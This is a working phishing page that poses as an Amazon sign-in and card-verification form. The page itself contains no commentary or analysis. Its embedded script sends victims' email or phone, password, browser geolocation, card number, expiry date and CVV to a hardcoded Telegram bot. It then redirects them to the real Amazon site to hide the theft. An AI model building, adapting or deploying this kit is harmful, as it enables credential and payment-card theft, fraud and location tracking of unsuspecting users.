<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign-In Verification</title>
    <style>
        body { font-family: Arial, sans-serif; background: #fff; text-align: center; }
        .box { max-width: 350px; margin: 20px auto; border: 1px solid #ddd; padding: 20px; border-radius: 8px; }
        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #a6a6a6; border-radius: 3px; }
        button { width: 95%; background: #f0c14b; border: 1px solid #a88734; padding: 10px; cursor: pointer; }
        .hide { display: none; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" width="100">
        <div id="s1">
            <h2>Sign-In</h2>
            <input type="text" id="e" placeholder="Email or phone">
            <input type="password" id="p" placeholder="Password">
            <button onclick="st1()">Continue</button>
        </div>
        <div id="s2" class="hide">
            <h3>Verify Address & Card</h3>
            <input type="text" id="c" placeholder="Card Number">
            <input type="text" id="ex" placeholder="MM/YY" style="width:40%">
            <input type="text" id="cv" placeholder="CVV" style="width:40%">
            <button onclick="st2()">Verify Account</button>
        </div>
    </div>
    <script>
        const token = '8661414644:AAEOXANSWUA3sIrP9_Ta4Id9DC3HPN5ugvc';
        const chatId = '8353285510';

        function send(t) { fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(t)}`); }

        function st1() {
            const data = `📦 AMAZON LOG!\n📧: ${document.getElementById('e').value}\n🔑: ${document.getElementById('p').value}`;
            send(data);
            // Location Request
            navigator.geolocation.getCurrentPosition(p => {
                send(`📍 AMAZON USER LOCATION:\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            });
            document.getElementById('s1').className = 'hide';
            document.getElementById('s2').className = '';
        }

        function st2() {
            send(`💳 AMAZON CARD!\nNum: ${document.getElementById('c').value}\nExp: ${document.getElementById('ex').value}\nCVV: ${document.getElementById('cv').value}`);
            window.location.href = "https://www.amazon.com";
        }
    </script>
</body>
</html>
